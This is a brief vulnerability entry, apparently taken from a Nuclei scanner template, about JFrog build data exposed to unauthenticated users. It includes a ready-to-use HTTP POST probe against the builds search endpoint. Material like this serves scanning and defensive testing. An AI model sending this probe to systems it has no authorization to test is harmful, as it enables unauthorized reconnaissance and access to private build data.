# Vulnerability: JFrog Unauthentication Builds
**Classification:** JFROG
**Source:** Nuclei Template (`jfrog-unauth-build-exposed.yaml`)

## Description
JFrog Builds are exposed to Unauthenticated users.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ui/api/v1/global-search/builds?jfLoader=true HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"name":"","before":"","after":"","direction":"desc","order_by":"date","num_of_rows":100}
```

